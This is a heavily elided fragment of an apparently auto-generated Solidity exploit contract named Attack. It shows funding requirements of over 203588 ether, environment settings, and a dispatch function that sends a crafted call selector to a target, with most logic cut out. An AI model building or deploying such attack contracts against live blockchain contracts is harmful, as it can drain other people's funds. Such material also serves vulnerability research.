 ...
 * parameter. Make sure to send at least 203588 ether and 360770741650587648 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x2b1c8c1227a000000000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                 ...
                 */
                bytes memory data = bytes(hex"22d122a9");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x2b1c8c1227a000000000; /* equals 203588 ether and 360770741650587648 wei */
    uint constant INITIAL_ETHER = 0x2b1c8c1227a000000000;
